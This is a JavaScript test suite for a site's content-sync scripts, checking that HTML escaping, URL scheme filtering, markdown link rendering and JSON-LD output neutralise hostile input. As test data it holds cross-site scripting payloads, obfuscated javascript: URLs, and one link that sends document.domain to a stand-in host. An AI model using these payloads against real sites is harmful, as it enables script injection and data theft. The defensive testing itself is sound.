#!/usr/bin/env node

/**
 * Tests for the content-sync scripts.
 *
 * Usage: node scripts/test-scripts.js
 *
 * These cover the failure modes that actually bit this repo: silent no-op
 * rewrites of index.html, unescaped RSS titles landing in generated HTML, and
 * frontmatter mangled by escape-then-truncate.
 */

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const posts = require('./update-posts.js');
const lib = require('./lib.js');

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ok    ${name}`);
  } catch (err) {
    failed++;
    console.error(`  FAIL  ${name}\n        ${err.message}`);
  }
}

function withTempIndex(body, fn) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'skaronis-test-'));
  const file = path.join(dir, 'index.html');
  fs.writeFileSync(file, body);
  try {
    return fn(file);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const SAMPLE_POST = {
  url: '/blog/hello-world/',
  title: 'Hello World',
  siteName: 'Substack',
  date: new Date('2026-03-15T12:00:00Z')
};

// ---------------------------------------------------------------------------
console.log('\nescapeHtml');

test('escapes the characters that break attributes and markup', () => {
  assert.strictEqual(
    posts.escapeHtml(`<img src=x onerror=alert(1)>`),
    '&lt;img src=x onerror=alert(1)&gt;'
  );
  assert.strictEqual(posts.escapeHtml('a "b" \'c\' & d'), 'a &quot;b&quot; &#39;c&#39; &amp; d');
});

test('handles null and undefined without throwing', () => {
  assert.strictEqual(posts.escapeHtml(null), '');
  assert.strictEqual(posts.escapeHtml(undefined), '');
});

// ---------------------------------------------------------------------------
console.log('\nformatMonthYear');

test('is stable regardless of the machine timezone', () => {
  // 1 March 00:30 UTC is still February in Vancouver. CI (UTC) and a local run
  // must not disagree, or they overwrite each other forever.
  const d = new Date('2026-03-01T00:30:00Z');
  assert.strictEqual(posts.formatMonthYear(d), 'March 2026');
});

// ---------------------------------------------------------------------------
console.log('\nrenderLatestPost');

test('escapes a hostile RSS title', () => {
  const html = posts.renderLatestPost({
    ...SAMPLE_POST,
    title: '</h2><script>alert(1)</script>'
  });
  assert.ok(!html.includes('<script>'), 'raw <script> leaked into the homepage');
  assert.ok(html.includes('&lt;script&gt;'), 'title was not escaped');
});

test('escapes a URL that would break out of the href attribute', () => {
  const html = posts.renderLatestPost({
    ...SAMPLE_POST,
    url: '/x" onmouseover="alert(1)'
  });
  assert.ok(!html.includes('onmouseover="alert(1)"'), 'attribute break-out was not neutralised');
  assert.ok(html.includes('&quot;'), 'url quote was not escaped');
});

test('a title containing $& is written literally', () => {
  // String.replace treats $& in the replacement as "the whole match". The old
  // code interpolated titles straight into a replacement string.
  const html = posts.renderLatestPost({ ...SAMPLE_POST, title: 'Cost $& Value $1' });
  assert.ok(html.includes('Cost $&amp; Value $1'), `got: ${html}`);
});

// ---------------------------------------------------------------------------
// Regression tests for the Devin review finding (2026-08-09): escaping alone
// does not stop a javascript: URL reaching an href.
console.log('\nsafeUrl');

test('accepts root-relative paths and https URLs', () => {
  assert.strictEqual(posts.safeUrl('/blog/x/'), '/blog/x/');
  assert.strictEqual(posts.safeUrl('https://example.com/p'), 'https://example.com/p');
});

test('rejects javascript, data and vbscript schemes', () => {
  for (const bad of [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)  ',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'http://example.com/insecure'
  ]) {
    assert.strictEqual(posts.safeUrl(bad), null, `should have rejected: ${JSON.stringify(bad)}`);
  }
});

test('rejects protocol-relative URLs', () => {
  assert.strictEqual(posts.safeUrl('//evil.example/x'), null);
});

test('rejects empty and missing values', () => {
  assert.strictEqual(posts.safeUrl(''), null);
  assert.strictEqual(posts.safeUrl(null), null);
  assert.strictEqual(posts.safeUrl(undefined), null);
});

test('renderLatestPost refuses to emit a javascript: link', () => {
  assert.throws(
    () => posts.renderLatestPost({ ...SAMPLE_POST, url: 'javascript:alert(document.domain)' }),
    /unsupported URL scheme/i
  );
});

// ---------------------------------------------------------------------------
console.log('\nupdateIndexHTML');

const GOOD_PAGE = `<html><body>
    <div>
                ${posts.LATEST_POST_START}
                <a href="/blog/old/" class="latest-content">
                    <h2 class="latest-title">Old Title</h2>
                    <p class="latest-meta">January 2020 · <span class="latest-source">Substack</span></p>
                </a>
                ${posts.LATEST_POST_END}
    </div>
</body></html>`;

test('rewrites the block between the markers', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    const out = rewriteVia(file, SAMPLE_POST);
    assert.ok(out.includes('Hello World'), 'new title missing');
    assert.ok(out.includes('/blog/hello-world/'), 'new url missing');
    assert.ok(out.includes('March 2026'), 'new date missing');
    assert.ok(!out.includes('Old Title'), 'old title still present');
    assert.ok(out.includes(posts.LATEST_POST_START), 'start marker was consumed');
    assert.ok(out.includes(posts.LATEST_POST_END), 'end marker was consumed');
  });
});

test('is idempotent', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    const once = rewriteVia(file, SAMPLE_POST);
    fs.writeFileSync(file, once);
    const twice = rewriteVia(file, SAMPLE_POST);
    assert.strictEqual(once, twice, 'second run produced different output');
  });
});

test('throws loudly when the markers are missing', () => {
  withTempIndex('<html><body><p>no markers here</p></body></html>', (file) => {
    assert.throws(
      () => rewriteVia(file, SAMPLE_POST),
      /markers/i,
      'a missing marker must fail the build, not silently no-op'
    );
  });
});

test('leaves no temp file behind', () => {
  withTempIndex(GOOD_PAGE, (file) => {
    rewriteVia(file, SAMPLE_POST);
    const leftovers = fs.readdirSync(path.dirname(file)).filter(f => f.includes('.tmp-'));
    assert.deepStrictEqual(leftovers, [], `temp files left: ${leftovers}`);
  });
});

// updateIndexHTML takes the target path, so tests operate purely on a temp file
// and can never touch the real homepage.
function rewriteVia(fixtureFile, post) {
  posts.updateIndexHTML(post, [], fixtureFile);
  return fs.readFileSync(fixtureFile, 'utf8');
}

// ---------------------------------------------------------------------------
console.log('\nrenderRecentPosts');

const RECENT = [
  { title: 'One', url: '/blog/one/', date: new Date('2026-03-02T00:00:00Z') },
  { title: 'Two', url: '/blog/two/', date: new Date('2026-02-02T00:00:00Z') },
  { title: 'Three', url: '/blog/three/', date: new Date('2026-01-02T00:00:00Z') },
  { title: 'Four', url: '/blog/four/', date: new Date('2025-12-02T00:00:00Z') },
  { title: 'Five', url: '/blog/five/', date: new Date('2025-11-02T00:00:00Z') },
  { title: 'Six', url: '/blog/six/', date: new Date('2025-10-02T00:00:00Z') }
];

test('renders at most five posts', () => {
  const html = posts.renderRecentPosts(RECENT);
  assert.strictEqual((html.match(/<li>/g) || []).length, 5);
  assert.ok(!html.includes('Six'), 'sixth post should not be rendered');
});

test('escapes titles and drops unsafe URLs, keeping the title as text', () => {
  const html = posts.renderRecentPosts([
    { title: '<script>alert(1)</script>', url: 'javascript:alert(1)', date: new Date('2026-03-02T00:00:00Z') }
  ]);
  assert.ok(!html.includes('<script>'), 'raw script tag leaked');
  assert.ok(!/javascript:/i.test(html), 'javascript: URL survived');
  assert.ok(html.includes('&lt;script&gt;'), 'title should still appear, escaped');
  assert.ok(!html.includes('<a href'), 'unsafe entry must not be linked');
});

// ---------------------------------------------------------------------------
// The secgate review (2026-08-09) found the URL guard had reached 7 of 9 sinks:
// update-blog.js and update-library.js rendered markdown links and images
// straight into attributes. The suite could not have caught it because it only
// imported update-posts.js. These test the shared renderer both now use.
console.log('\nrenderMarkdownLinks (shared by update-blog and update-library)');

test('renders a normal link and image', () => {
  assert.strictEqual(
    lib.renderMarkdownLinks('[text](https://example.com/p)'),
    '<a href="https://example.com/p">text</a>'
  );
  assert.strictEqual(
    lib.renderMarkdownLinks('![alt](https://example.com/i.png)'),
    '<img src="https://example.com/i.png" alt="alt">'
  );
});

test('a javascript: link degrades to plain text', () => {
  const out = lib.renderMarkdownLinks("[click](javascript:location='//evil.tld/'+document.domain)");
  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
  assert.ok(!out.includes('<a '), 'must not emit an anchor');
  assert.ok(out.includes('click'), 'link text should survive');
});

test('a javascript: image degrades to its alt text', () => {
  const out = lib.renderMarkdownLinks('![pic](javascript:alert(1))');
  assert.ok(!/javascript:/i.test(out), `javascript: survived: ${out}`);
  assert.ok(!out.includes('<img'), 'must not emit an img');
});

test('an attribute break-out cannot escape the src', () => {
  // The percent-decode path could reintroduce a literal quote.
  const out = lib.renderMarkdownLinks('![x](https://e.com/a.png" onerror="alert(1))');
  assert.ok(!/onerror\s*=\s*"?alert/.test(out.replace(/&quot;/g, '"').replace(/&#39;/g, "'")) ||
            !out.includes('<img'), `break-out survived: ${out}`);
});

test('protocol-relative and data URLs are refused', () => {
  for (const bad of ['[a](//evil.example/x)', '[a](data:text/html,<script>alert(1)</script>)']) {
    const out = lib.renderMarkdownLinks(bad);
    assert.ok(!out.includes('<a '), `should not link: ${bad} -> ${out}`);
  }
});

// ---------------------------------------------------------------------------
console.log('\njsonLdScript');

test('neutralises a </script> breakout inside JSON-LD', () => {
  const out = lib.jsonLdScript({ name: '</script><img src=x onerror=alert(1)>' });
  assert.ok(!out.includes('</script>'), 'raw </script> survived into a script element');
  assert.ok(out.includes('\\u003c'), 'expected < to be unicode-escaped');
  assert.doesNotThrow(() => JSON.parse(out), 'output must still be valid JSON');
});

test('a trailing backslash still produces parseable JSON', () => {
  // update-blog.js used escapeHtml inside JSON string literals, which left
  // backslashes unescaped and could emit unparseable JSON-LD.
  const out = lib.jsonLdScript({ title: 'ends with a backslash \\' });
  assert.doesNotThrow(() => JSON.parse(out));
});

// ---------------------------------------------------------------------------
console.log('\ngenerateMarkdownFile frontmatter');

test('quotes a title containing double quotes', () => {
  const result = posts.generateMarkdownFile({
    title: 'She said "hello" to me',
    description: 'short',
    date: new Date('2026-01-05T00:00:00Z'),
    url: 'https://example.com/p',
    originalUrl: 'https://example.com/p',
    siteName: 'Substack',
    content: '<p>hi</p>'
  });
  const fm = result.content.split('---')[1];
  assert.ok(fm.includes('title: "She said \\"hello\\" to me"'), `got: ${fm}`);
});

test('a 200-char boundary cannot leave a dangling escape', () => {
  // Escape-then-truncate could cut between a backslash and its quote and emit
  // unparseable frontmatter. Truncate first, then quote.
  const description = 'x'.repeat(199) + '"' + 'tail';
  const result = posts.generateMarkdownFile({
    title: 'T',
    description,
    date: new Date('2026-01-05T00:00:00Z'),
    url: 'https://example.com/p',
    originalUrl: 'https://example.com/p',
    siteName: 'Substack',
    content: '<p>hi</p>'
  });
  const line = result.content.split('\n').find(l => l.startsWith('description:'));
  const value = line.slice('description: '.length);
  assert.doesNotThrow(() => JSON.parse(value), `unparseable frontmatter value: ${value}`);
});

// ---------------------------------------------------------------------------
console.log(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed === 0 ? 0 : 1);
